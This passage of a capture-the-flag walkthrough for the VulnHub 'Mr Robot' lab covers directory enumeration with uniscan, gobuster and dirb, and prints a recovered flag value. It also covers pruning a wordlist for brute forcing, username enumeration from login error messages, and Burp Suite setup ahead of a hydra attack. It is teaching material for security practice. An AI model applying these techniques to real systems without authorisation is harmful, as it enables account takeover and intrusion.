| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
| Plugin name: Upload Form Detect v.1.1 Loaded.
| Plugin name: Code Disclosure v.1.1 Loaded.
| Plugin name: E-mail Detection v.1.1 Loaded.
| Plugin name: External Host Detect v.1.2 Loaded.
| Plugin name: phpinfo() Disclosure v.1 Loaded.
| Plugin name: Web Backdoor Disclosure v.1.1 Loaded.
| [+] Crawling finished, 53 URL's found!
|
| FCKeditor File Upload:
|
| Timthumb:
|
| File Upload Forms:
|
| Source Code Disclosure:
|
| E-mails:
|
| External hosts:
| [+] External Host Found: http://gmpg.org
| [+] External Host Found: https://wordpress.org
| [+] External Host Found: http://browsehappy.com
|
| PHPinfo() Disclosure:
|
| Web Backdoors:
|
| Ignored Files: 
| http://192.168.125.132/wp-includes/js/comment-reply.min.js?ver=4.3.1
| http://192.168.125.132/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1
| http://192.168.125.132/wp-content/themes/twentyfifteen/js/skip-link-focus-fix.js?ver=20141010
| http://192.168.125.132/wp-content/themes/twentyfifteen/css/ie7.css?ver=20141010
| http://192.168.125.132/wp-content/themes/twentyfifteen/css/ie.css?ver=20141010
| http://192.168.125.132/wp-admin/css/login.min.css?ver=4.3.1
| http://192.168.125.132/wp-includes/js/jquery/jquery.js?ver=1.11.3
| http://192.168.125.132/wp-content/themes/twentyfifteen/js/functions.js?ver=20150330
| http://192.168.125.132/wp-content/themes/twentyfifteen/js/keyboard-image-navigation.js?ver=20141010
| http://192.168.125.132/wp-includes/wlwmanifest.xml
===================================================================================================
| Dynamic tests:
| Plugin name: Learning New Directories v.1.2 Loaded.
| Plugin name: FCKedior tests v.1.1 Loaded.
| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
| Plugin name: Find Backup Files v.1.2 Loaded.
| Plugin name: Blind SQL-injection tests v.1.3 Loaded.
| Plugin name: Local File Include tests v.1.1 Loaded.
| Plugin name: PHP CGI Argument Injection v.1.1 Loaded.
| Plugin name: Remote Command Execution tests v.1.1 Loaded.
| Plugin name: Remote File Include tests v.1.2 Loaded.
| Plugin name: SQL-injection tests v.1.2 Loaded.
| Plugin name: Cross-Site Scripting tests v.1.2 Loaded.
| Plugin name: Web Shell Finder v.1.3 Loaded.
| [+] 1 New directories added
|                                                                                                   
|                                                                                                   
| FCKeditor tests:
|                                                                                                   
|                                                                                                   
| Timthumb < 1.33 vulnerability:
|                                                                                                   
|                                                                                                   
| Backup Files:
|                                                                                                   
|                                                                                                   
| Blind SQL Injection:
|                                                                                                   
|                                                                                                   
| Local File Include:
|                                                                                                   
|                                                                                                   
| PHP CGI Argument Injection:
|                                                                                                   
|                                                                                                   
| Remote Command Execution:
|                                                                                                   
|                                                                                                   
| Remote File Include:
|                                                                                                   
|                                                                                                   
| SQL Injection:
|                                                                                                   
|                                                                                                   
| Cross-Site Scripting (XSS):
|                                                                                                   
|                                                                                                   
| Web Shell Finder:
===================================================================================================
| Static tests:
| Plugin name: Local File Include tests v.1.1 Loaded.
| Plugin name: Remote Command Execution tests v.1.1 Loaded.
| Plugin name: Remote File Include tests v.1.1 Loaded.
|                                                                                                   
|                                                                                                   
| Local File Include:
|                                                                                                   
|                                                                                                   
| Remote Command Execution:
|                                                                                                   
|                                                                                                   
| Remote File Include:
===================================================================================================
Scan end date: 8-7-2021 15:2:46



HTML report saved in: report/192.168.125.132.html
```

<p></p>
Above is the log file view which can be accessed through the uniscan GUI.
Some interesting parts are:
<p></p>

```
===================================================================================================
|
| Directory check:
| [+] CODE: 200 URL: http://192.168.125.132/Image/
| [+] CODE: 200 URL: http://192.168.125.132/admin/
| [+] CODE: 200 URL: http://192.168.125.132/feed/
| [+] CODE: 200 URL: http://192.168.125.132/image/
| [+] CODE: 200 URL: http://192.168.125.132/login/
| [+] CODE: 200 URL: http://192.168.125.132/rss/
| [+] CODE: 200 URL: http://192.168.125.132/wp-login/
| [+] CODE: 200 URL: http://192.168.125.132/wp-admin/
===================================================================================================
|                                                                                                   
| File check:
| [+] CODE: 200 URL: http://192.168.125.132/admin/index.html
| [+] CODE: 200 URL: http://192.168.125.132/admin/index.php
| [+] CODE: 200 URL: http://192.168.125.132/favicon.ico
| [+] CODE: 200 URL: http://192.168.125.132/index.html
| [+] CODE: 200 URL: http://192.168.125.132/index.html%20
| [+] CODE: 200 URL: http://192.168.125.132/index.php
| [+] CODE: 200 URL: http://192.168.125.132/license.txt
| [+] CODE: 200 URL: http://192.168.125.132/readme
| [+] CODE: 200 URL: http://192.168.125.132/readme.html
| [+] CODE: 200 URL: http://192.168.125.132/robots.txt
| [+] CODE: 200 URL: http://192.168.125.132/search/htx/sqlqhit.asp
| [+] CODE: 200 URL: http://192.168.125.132/search/sqlqhit.asp
| [+] CODE: 200 URL: http://192.168.125.132/search/htx/SQLQHit.asp
| [+] CODE: 200 URL: http://192.168.125.132/search/SQLQHit.asp
| [+] CODE: 200 URL: http://192.168.125.132/sitemap.xml
===================================================================================================
| 
| Ignored Files: 
| http://192.168.125.132/wp-includes/js/comment-reply.min.js?ver=4.3.1
| http://192.168.125.132/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1
| http://192.168.125.132/wp-content/themes/twentyfifteen/js/skip-link-focus-fix.js?ver=20141010
| http://192.168.125.132/wp-content/themes/twentyfifteen/css/ie7.css?ver=20141010
| http://192.168.125.132/wp-content/themes/twentyfifteen/css/ie.css?ver=20141010
| http://192.168.125.132/wp-admin/css/login.min.css?ver=4.3.1
| http://192.168.125.132/wp-includes/js/jquery/jquery.js?ver=1.11.3
| http://192.168.125.132/wp-content/themes/twentyfifteen/js/functions.js?ver=20150330
| http://192.168.125.132/wp-content/themes/twentyfifteen/js/keyboard-image-navigation.js?ver=20141010
| http://192.168.125.132/wp-includes/wlwmanifest.xml
===================================================================================================
```

<p></p>
Here we can see a list of directories, files and ignored files. Again, all of this information will help us when it comes to looking at the website.
<p></p>
</details>
<p></p>
<details>
    <summary>gobuster</summary>
<p></p>
Gobuster is another prepackaged program which can be used for many things bellow is the help file.
<p></p>

```
❯ gobuster -h
Usage:
  gobuster [command]

Available Commands:
  dir         Uses directory/file enumeration mode
  dns         Uses DNS subdomain enumeration mode
  fuzz        Uses fuzzing mode
  help        Help about any command
  s3          Uses aws bucket enumeration mode
  version     shows the current version
  vhost       Uses VHOST enumeration mode

Flags:
      --delay duration    Time each thread waits between requests (e.g. 1500ms)
  -h, --help              help for gobuster
      --no-error          Don't display errors
  -z, --no-progress       Don't display progress
  -o, --output string     Output file to write results to (defaults to stdout)
  -p, --pattern string    File containing replacement patterns
  -q, --quiet             Don't print the banner and other noise
  -t, --threads int       Number of concurrent threads (default 10)
  -v, --verbose           Verbose output (errors)
  -w, --wordlist string   Path to the wordlist

Use "gobuster [command] --help" for more information about a command.
```

<p></p>
For this situation we are going to use the <kbd>dir</kbd> command to enumerate directories and files, the command looks like this:
<p></p>

```
gobuster dir -u http://192.168.125.132 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt
```

<p></p>
In this command u can see we use the <kbd>dir</kbd> command followed by the <kbd>-u</kbd> command to point gobuster at the url, we then use the <kbd>-w</kbd> command to point gobuster to our desired wordlist. Here you can see I have used the raft-large-files.txt wordlist from <a href="https://github.com/danielmiessler/SecLists" rel="nofollow">SecLists</a>. (I strongly recommend downloading this git it contains tons of wordlists that can be used for multiple things)
<p></p>
This command outputs this:
<p></p>

```
❯ gobuster dir -u http://192.168.125.132 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.125.132
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/08 15:31:07 Starting gobuster in directory enumeration mode
===============================================================
/xmlrpc.php           (Status: 405) [Size: 42]
/index.php            (Status: 301) [Size: 0] [--> http://192.168.125.132/]
/wp-login.php         (Status: 200) [Size: 2685]                           
/wp-register.php      (Status: 301) [Size: 0] [--> http://192.168.125.132/wp-login.php?action=register]
/index.html           (Status: 200) [Size: 1188]                                                       
/favicon.ico          (Status: 200) [Size: 0]                                                          
/readme.html          (Status: 200) [Size: 64]                                                         
/.htaccess            (Status: 403) [Size: 218]                                                        
/license.txt          (Status: 200) [Size: 309]                                                        
/robots.txt           (Status: 200) [Size: 41]                                                         
/wp-commentsrss2.php  (Status: 301) [Size: 0] [--> http://192.168.125.132/comments/feed/]              
/wp-config.php        (Status: 200) [Size: 0]                                                          
/sitemap.xml          (Status: 200) [Size: 0]                                                          
/.                    (Status: 200) [Size: 1188]                                                       
/wp-settings.php      (Status: 500) [Size: 0]                                                          
/wp-app.php           (Status: 403) [Size: 0]                                                          
/wp-rss.php           (Status: 301) [Size: 0] [--> http://192.168.125.132/feed/]                       
/wp-rss2.php          (Status: 301) [Size: 0] [--> http://192.168.125.132/feed/]                       
/wp-cron.php          (Status: 200) [Size: 0]                                                          
/wp-rdf.php           (Status: 301) [Size: 0] [--> http://192.168.125.132/feed/rdf/]                   
/wp-atom.php          (Status: 301) [Size: 0] [--> http://192.168.125.132/feed/atom/]                  
/wp-feed.php          (Status: 301) [Size: 0] [--> http://192.168.125.132/feed/]                       
/wp-links-opml.php    (Status: 200) [Size: 227]                                                        
/.html                (Status: 403) [Size: 214]                                                        
/sitemap.xml.gz       (Status: 200) [Size: 0]                                                          
/wp-load.php          (Status: 200) [Size: 0]                                                          
/wp-signup.php        (Status: 302) [Size: 0] [--> http://192.168.125.132/wp-login.php?action=register]
/wp-activate.php      (Status: 302) [Size: 0] [--> http://192.168.125.132/wp-login.php?action=register]
/.htpasswd            (Status: 403) [Size: 218]                                                        
/.htm                 (Status: 403) [Size: 213]                                                        
/.htpasswds           (Status: 403) [Size: 219]                                                        
Progress: 2110 / 37043 (5.70%)                                                                        [ERROR] 2021/07/08 15:31:19 [!] Get "http://192.168.125.132/wp-mail.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/.htgroup             (Status: 403) [Size: 217]                                                        
/.htaccess.bak        (Status: 403) [Size: 222]                                                        
/.htuser              (Status: 403) [Size: 216]                                                        
/.ht                  (Status: 403) [Size: 212]                                                        
/.htc                 (Status: 403) [Size: 213]                                                        
/.htaccess.old        (Status: 403) [Size: 222]                                                        
/.htacess             (Status: 403) [Size: 217]                                                        
Progress: 25362 / 37043 (68.47%)                                                                      [ERROR] 2021/07/08 15:34:13 [!] parse "http://192.168.125.132/directory\t\te.g.": net/url: invalid control character in URL
                                                                                                       
===============================================================
2021/07/08 15:36:00 Finished
===============================================================
```

<p></p>
The above output shows us the files and directories.
</details>
<p></p>
<details>
    <summary>dirb</summary>
<p></p>
dirb is another prepackaged program just like gobuster, the help file looks like this:
<p></p>

```
❯ dirb

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

dirb <url_base> [<wordlist_file(s)>] [options]

========================= NOTES =========================
 <url_base> : Base URL to scan. (Use -resume for session resuming)
 <wordlist_file(s)> : List of wordfiles. (wordfile1,wordfile2,wordfile3...)

======================== HOTKEYS ========================
 'n' -> Go to next directory.
 'q' -> Stop scan. (Saving state for resume)
 'r' -> Remaining scan stats.

======================== OPTIONS ========================
 -a <agent_string> : Specify your custom USER_AGENT.
 -b : Use path as is.
 -c <cookie_string> : Set a cookie for the HTTP request.
 -E <certificate> : path to the client certificate.
 -f : Fine tunning of NOT_FOUND (404) detection.
 -H <header_string> : Add a custom header to the HTTP request.
 -i : Use case-insensitive search.
 -l : Print "Location" header when found.
 -N <nf_code>: Ignore responses with this HTTP code.
 -o <output_file> : Save output to disk.
 -p <proxy[:port]> : Use this proxy. (Default port is 1080)
 -P <proxy_username:proxy_password> : Proxy Authentication.
 -r : Don't search recursively.
 -R : Interactive recursion. (Asks for each directory)
 -S : Silent Mode. Don't show tested words. (For dumb terminals)
 -t : Don't force an ending '/' on URLs.
 -u <username:password> : HTTP Authentication.
 -v : Show also NOT_FOUND pages.
 -w : Don't stop on WARNING messages.
 -X <extensions> / -x <exts_file> : Append each word with this extensions.
 -z <millisecs> : Add a milliseconds delay to not cause excessive Flood.

======================== EXAMPLES =======================
 dirb http://url/directory/ (Simple Test)
 dirb http://url/ -X .html (Test files with '.html' extension)
 dirb http://url/ /usr/share/dirb/wordlists/vulns/apache.txt (Test with apache.txt wordlist)
 dirb https://secure_url/ (Simple Test with SSL)
```

<p></p>
The command we will use is:
<p></p>

```
dirb http://192.168.125.132 /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt
```

<p></p>
Which outputs:
<p></p>

```
❯ dirb http://192.168.125.132 /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Jul  8 15:50:43 2021
URL_BASE: http://192.168.125.132/
WORDLIST_FILES: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt

-----------------

GENERATED WORDS: 37025                                                         

---- Scanning URL: http://192.168.125.132/ ----
+ http://192.168.125.132/index.php (CODE:301|SIZE:0)                                                                                                                                         
+ http://192.168.125.132/xmlrpc.php (CODE:405|SIZE:42)                                                                                                                                       
+ http://192.168.125.132/wp-login.php (CODE:200|SIZE:2685)                                                                                                                                   
+ http://192.168.125.132/wp-register.php (CODE:301|SIZE:0)                                                                                                                                   
+ http://192.168.125.132/index.html (CODE:200|SIZE:1104)                                                                                                                                     
+ http://192.168.125.132/favicon.ico (CODE:200|SIZE:0)                                                                                                                                       
+ http://192.168.125.132/readme.html (CODE:200|SIZE:64)                                                                                                                                      
+ http://192.168.125.132/license.txt (CODE:200|SIZE:309)                                                                                                                                     
+ http://192.168.125.132/robots.txt (CODE:200|SIZE:41)                                                                                                                                       
+ http://192.168.125.132/wp-commentsrss2.php (CODE:301|SIZE:0)                                                                                                                               
+ http://192.168.125.132/wp-config.php (CODE:200|SIZE:0)                                                                                                                                     
+ http://192.168.125.132/sitemap.xml (CODE:200|SIZE:0)                                                                                                                                       
+ http://192.168.125.132/wp-settings.php (CODE:500|SIZE:0)                                                                                                                                   
+ http://192.168.125.132/. (CODE:200|SIZE:1188)                                                                                                                                              
+ http://192.168.125.132/wp-app.php (CODE:403|SIZE:0)                                                                                                                                        
+ http://192.168.125.132/wp-rss.php (CODE:301|SIZE:0)                                                                                                                                        
+ http://192.168.125.132/wp-rss2.php (CODE:301|SIZE:0)                                                                                                                                       
+ http://192.168.125.132/wp-mail.php (CODE:500|SIZE:3064)                                                                                                                                    
+ http://192.168.125.132/wp-cron.php (CODE:200|SIZE:0)                                                                                                                                       
+ http://192.168.125.132/wp-rdf.php (CODE:301|SIZE:0)                                                                                                                                        
+ http://192.168.125.132/wp-atom.php (CODE:301|SIZE:0)                                                                                                                                       
+ http://192.168.125.132/wp-feed.php (CODE:301|SIZE:0)                                                                                                                                       
+ http://192.168.125.132/wp-links-opml.php (CODE:200|SIZE:227)                                                                                                                               
+ http://192.168.125.132/sitemap.xml.gz (CODE:200|SIZE:0)                                                                                                                                    
+ http://192.168.125.132/wp-load.php (CODE:200|SIZE:0)                                                                                                                                       
+ http://192.168.125.132/wp-signup.php (CODE:302|SIZE:0)                                                                                                                                     
+ http://192.168.125.132/wp-activate.php (CODE:302|SIZE:0)                                                                                                                                   
```

<p></p>
Above you can see the directory and file results.

</details>
</details>
<p></p>
Now that we have done initial enumeration we can start looking at the website being hosted. Going into firefox and going to the ip address we are presented with the following page.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/e4ed451224096481e6e6cf68d9cbcfbf83041721/Starting_Point/VulnHub/MrRobot/images/website.png"><br>
</div>
<p></p>
This website is basically a interactive command line, you could spend ages looking through each input and the information that returns (you can also try Remote Code Execution (RCE) however I couldn't get RCE to work) however this is a honypot and we should start looking at the files and directories we found from our enumeration.
<p></p>
Lets go down the list, to start with we will go to /admin/
<p></p>
This is a bit of a joke as it redirects you to /admin/index.html and puts you into an infinite redirect loop looking at the page source informaton (right click on the web page then click page source) we can see the back end.

```
<!doctype html>
<!--
\   //~~\ |   |    /\  |~~\|~~  |\  | /~~\~~|~~    /\  |  /~~\ |\  ||~~
 \ /|    ||   |   /__\ |__/|--  | \ ||    | |     /__\ | |    || \ ||--
  |  \__/  \_/   /    \|  \|__  |  \| \__/  |    /    \|__\__/ |  \||__
-->
<html class="no-js" lang="">
  <head>
    

    <link rel="stylesheet" href="css/A.main-600a9791.css.pagespeed.cf.D0r67Hwe2q.css">

    <script src="js/vendor/vendor-48ca455c.js.pagespeed.jm.V7Qfw6bd5C.js"></script>

    <script>var USER_IP='208.185.115.6';var BASE_URL='index.html';var RETURN_URL='index.html';var REDIRECT=false;window.log=function(){log.history=log.history||[];log.history.push(arguments);if(this.console){console.log(Array.prototype.slice.call(arguments));}};</script>

  </head>
  <body>
    <!--[if lt IE 9]>
      <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
    

    <!-- Google Plus confirmation -->
    <div id="app"></div>

    
    <script src="js/s_code.js.pagespeed.jm.I78cfHQpbQ.js"></script>
    <script src="js/main-acba06a5.js.pagespeed.jm.YdSb2z1rih.js"></script>
</body>
</html>
```

<p></p>
This turns out to be a dead end, so we will try the next item on our list /wp-login.php.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/f1339d44d8be1ebf4103e9709008b3577ac0577f/Starting_Point/VulnHub/MrRobot/images/wp-login.png"><br>
</div>
<p></p>
We can see that we have found a login page, this is important and getting access to this will be the first stage to accessing the target box, for now we wont do anything more but we will come back later.
<p></p>
Next on our list is /robots.txt
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/42cb81f89c32aa6b5ae62ee8ca27aa5bf9974e42/Starting_Point/VulnHub/MrRobot/images/robots.png"><br>
</div>
<p></p>
This is a pretty big find for us we can see two files being referenced, fsocity.dic and key-1-of-3.txt... We have found our first key file! but how do we access it and what is a robots.txt file anyway?
<br>
A robots.txt file tells search engine crawlers which URLs the crawler can access on your site. This is used mainly to avoid overloading your site with requests.
<br>
Ok so we now know what a robots.txt file is for (this is a go to file whenever enumerating a website!) how do we access the files it is referencing? It's pretty simple, we will just put the file name after the ip address ie. 192.168.125.132/fsocity.dic...
<p></p>
We will start with the key file since it is our first flag we have found!
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/d10b9fd05a6cf4624b29de91f9181271cc954f68/Starting_Point/VulnHub/MrRobot/images/key1.png"><br>
</div>
<p></p>
We can see this redirects us to another page with the key text on it.
<p></p>
key1 = 073403c8a58a1f80d943455fb30724b9
<p></p>
Now lets look at that dictionary file we saw in the robots.txt. Again we will navigate to it by placing it after the ip address.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/0e2a6fa7502bbe783e5953321b4ba25ed2491edc/Starting_Point/VulnHub/MrRobot/images/fsocity.png"><br>
</div>
<p></p>
When we navigate to this we are presented with a download box, we will download the dictionary so we can use it later... (in ctf's being given a dictionary file will normally be used for some kind of brute force attack)
<p></p>
Now we are going to have a look at this dictionary file and see if we can improve it.
<p></p>
If we run wc (word count) against the .dic file we find out how many lines of text it contains.
<p></p>

```
❯ wc fsocity.dic
 858160  858160 7245381 fsocity.dic
```

<p></p>
This is telling us that there are 858160 lines within the file, using this to brute force something would take a considerable amount of time. Lets see if we can improve the efficiency of this dictionary file. To do this we will ensure that there are no duplicated lines within the file using the command below.
<p></p>

```
cat fsocity.dic | sort | uniq > uniq.dic
```

<p></p>
In this command we read the .dic file then piped (|) it to <kbd>sort</kbd> then piping it to <kbd>uniq</kbd> and outputting that to a new file. We can see what this has achieved by running <kbd>wc</kbd> on our new file.
<p></p>

```
❯ wc uniq.dic
11451 11451 96747 uniq.dic
```

<p></p>
We can see that it has brought the line number down to 11451 by getting rid of all the duplicate lines. This is much more efficient than the 858160 lines we had previously. We are going to make one more file now using a modification of our previous command.
<p></p>

```
cat fsocity.dic | sort | uniq -u > single.dic
```

<p></p>
In this command we have outputted the lines that didnt have a duplicate within the file. We can run <kbd>wc</kbd> on this new file and see what we have produced.
<p></p>

```
❯ wc single.dic
 10  10 156 single.dic
```

<p></p>
As we can see we have created a file with only 10 lines!, this means these 10 lines weren't repeated throughout the etire file. People have asked me why I created this file and didn't just use the uniq.dic file, I think it is easier to run a 10 line bruteforce then move onto the 11K file because I think its more likely that a password or username wouldn't be repeated, overall it will save me time.
<p></p>
Now that we have setup our .dic file for bruteforcing we will return to it after completing our exploration of our enumerated files and directories. The last page we are going to look at is the /0/ directory.
<p></p>
Navigating to /0/ we are presented with a users word press blog.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/d1bd5e25f9f192517ffa91e1c9efdd13d5713e8f/Starting_Point/VulnHub/MrRobot/images/blog.png"><br>
</div>
<p></p>
This is a very good find as we can use it to enumerate usernames using a program called wpscan, we will come back to this later.
<p></p>
To start with we are going to learn how to manually enumerate usernames using the login page we found previously.
<p></p>
We will start by looking at what returns we get when we submit text through the login box, we will enter 'test' in both the username and password box and see what we get.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/e1f87870686d3884514f2093ca35c0fe199e561e/Starting_Point/VulnHub/MrRobot/images/userandpass.png"><br>
</div>
<p></p>
We can see that we are given a return of "invalid username" next we will try only the username.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/e1f87870686d3884514f2093ca35c0fe199e561e/Starting_Point/VulnHub/MrRobot/images/useronly.png"><br>
</div>
<p></p>
This time we get a return of "the password field is empty". Finally we will try only the password.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/e1f87870686d3884514f2093ca35c0fe199e561e/Starting_Point/VulnHub/MrRobot/images/passonly.png"><br>
</div>
<p></p>
This time we are told that "the username field is empty".
<p></p>
The important information we can pull from our tests is from our first test. The page returning "invalid username" hints to us that this is a badly configured login page. If the page is telling us that the username is invalid it gives us an in for enumerating usernames because if the username is correct we would assume it would accept it and then tell us that the password is incorrect. A properly configured login page would always return "username or password are incorrect" we will test this theory now using a tool called hydra.
<p></p>
Below is the help file for hydra.
<p></p>

```
❯ sudo hydra
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]

Options:
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  -C FILE   colon separated "login:pass" format, instead of -L/-P options
  -M FILE   list of servers to attack, one entry per line, ':' to specify port
  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
  -U        service module usage details
  -m OPT    options specific for a module, see -U output for information
  -h        more command line options (COMPLETE HELP)
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
  service   the service to crack (see below for supported protocols)
  OPT       some service modules support additional input (-U for module help)

Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp

Hydra is a tool to guess/crack valid login/password pairs.
Licensed under AGPL v3.0. The newest version is always available at;
https://github.com/vanhauser-thc/thc-hydra
Please don't use in military or secret service organizations, or for illegal
purposes. (This is a wish and non-binding - most such people do not care about
laws and ethics anyway - and tell themselves they are one of the good ones.)

Example:  hydra -l user -P passlist.txt ftp://192.168.0.1
```

<p></p>
It all looks very complicated but hydra follows a general syntaxt that you can modify whenever you need to use it. IOT for us to use hydra we need to gather a bit more information, and that is capturing the request sent when we try to login. To do this we will use Burp Suit.
<p></p>
Burp requires a bit of setup to work and that is we need to pass our internet traffic through a proxy, I use foxy proxy which I will explain how to set up below.
<p></p>
First we need to google foxy proxy. Navigate to the first link, foxy proxy standard.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/18702bff313bf3952c16b4b81fe5c92084fe2674/Starting_Point/VulnHub/MrRobot/images/googlefoxy.png"><br>
</div>
<p></p>
Next we need to click add to firefox.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/18702bff313bf3952c16b4b81fe5c92084fe2674/Starting_Point/VulnHub/MrRobot/images/addtofire.png"><br>
</div>
<p></p>
We will then be presented with a tool bar popup, click add again.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/18702bff313bf3952c16b4b81fe5c92084fe2674/Starting_Point/VulnHub/MrRobot/images/addtoolbar.png"><br>
</div>
<p></p>
We can see that an icon has appeared on the right hand side of our tool bar, click it followed by options, we will then be presented with this screen.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/18702bff313bf3952c16b4b81fe5c92084fe2674/Starting_Point/VulnHub/MrRobot/images/foxyoptions.png"><br>
</div>
<p></p>
We then need to click add on the left of the screen and then fill out the settings you can see below,
<br>
name = Burp
<br>
proxy IP address = 127.0.0.1
<br>
port = 8080
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/18702bff313bf3952c16b4b81fe5c92084fe2674/Starting_Point/VulnHub/MrRobot/images/foxysettings.png"><br>
</div>
<p></p>
Finally click save and you can see that your proxy has been created, now whenever you want to direct traffic through burp you simply click on the icon in your toolbar and click burp and all your internet traffic will be redirected.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/18702bff313bf3952c16b4b81fe5c92084fe2674/Starting_Point/VulnHub/MrRobot/images/foxyfinished.png"><br>
</div>
<p></p>
Now that we have foxy proxy set up and we can redirect our traffic to burp we can start burp and have a look. Look for it in your applications menu, I am using Parrot so this is where it is located for me, however if you are using kali or some other distro it may be located somewhere else.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/8baac8906c626ac8a6a7fe866c6e171f9a13875e/Starting_Point/VulnHub/MrRobot/images/burpmenu.png"><br>
</div>
<p></p>
Once we start it I am presented with a JRE popup, igonore this and click ok.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/8baac8906c626ac8a6a7fe866c6e171f9a13875e/Starting_Point/VulnHub/MrRobot/images/burpJRE.png"><br>
</div>
<p></p>
Next an update pop up appears, I ignore this and click close as occasionally updating things will break dependancies on linux.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/8baac8906c626ac8a6a7fe866c6e171f9a13875e/Starting_Point/VulnHub/MrRobot/images/burpupdate.png"><br>
</div>
<p></p>
We are then given the project creation window, since we are using burp free we can only create a tempory project so click next.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/8baac8906c626ac8a6a7fe866c6e171f9a13875e/Starting_Point/VulnHub/MrRobot/images/burptemp.png"><br>
</div>
<p></p>
Next we are asked about configuration settings, we are just going to use burp defaults so click start.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/8baac8906c626ac8a6a7fe866c6e171f9a13875e/Starting_Point/VulnHub/MrRobot/images/burpdefaults.png"><br>
</div>
<p></p>
We are then taken to the burp dashboard.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/8baac8906c626ac8a6a7fe866c6e171f9a13875e/Starting_Point/VulnHub/MrRobot/images/burpdashboard.png"><br>
</div>
<p></p>
Finally we need to use the burp proxy so using the tabs at the top navigate to the proxy tab.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/8baac8906c626ac8a6a7fe866c6e171f9a13875e/Starting_Point/VulnHub/MrRobot/images/burpproxy.png"><br>
</div>
<p></p>
Now that we have our proxy in firefox configured and Burp Suite up and running we can send our login request to burp and capture the traffic. Switch back to your web browser, turn the foxy proxy burp profile on (you can see in my toolbar there is a green burp on my foxy proxy), enter test into both the username and password and press login.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/092dfd0dc511d5f8aa87c766ee31755da23a06a7/Starting_Point/VulnHub/MrRobot/images/wpburptest.png"><br>
</div>
<p></p>
You should notice when you press log in nothing happens, its like the web page has frozen (to continue using the internet you will need to turn of the proxy later otherwise all your internet traffic will be passed to burp [you can get around this by setting up targets in burp]). Switch back to burp and you should see that the traffic has been captured, what is occuring is that burp suit is holding the request and it is waiting for you to actually send it (burp suit is a very big program and is a fairly steep learning curve so I would recomment doing a course on it, TryHackMe has a good one). Lets have a look at the internet traffic captured.
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/cbc871b6a3741e70480fb88d9e74cf8268c74085/Starting_Point/VulnHub/MrRobot/images/wpburp.png"><br>
</div>
<p></p>
